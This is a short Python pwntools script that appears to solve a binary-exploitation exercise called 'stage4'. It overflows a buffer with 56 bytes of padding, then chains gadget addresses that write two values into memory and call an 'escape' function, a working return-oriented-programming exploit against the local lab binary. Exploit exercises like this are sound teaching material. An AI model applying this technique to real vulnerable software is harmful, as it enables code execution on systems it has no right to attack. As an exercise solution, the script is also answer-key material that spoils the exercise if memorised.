import sys
from pwn import process, context, p64, ELF, gdb
import time
import re

target = './stage4'
context.binary = ELF(target, checksec=False)

loadRax = 0x401a67
changeAddress = 0x401a6b
loadRaxAddress = 0x401a6f
callEscape = 0x401a75




p = process(target)
io = p

# Receive output from program and print it in ASCII
output = io.recv()
print(output.decode('ascii'))

############### YOUR INPUT HERE ####################

input = b'a'*56
input += p64(loadRax)
input += p64(0xf1d81d9c8a14bf8)
input += p64(changeAddress)
input += p64(0x405068)
input += p64(loadRaxAddress)

input += p64(loadRax)
input += p64(0xee5f95c253fee07)
input += p64(changeAddress)
input += p64(0x405060)
input += p64(loadRaxAddress)
input += p64(callEscape)

####################################################

# Send input to program
io.sendline(input)

# Get output
output = io.recv()

print(output.decode('ascii'))
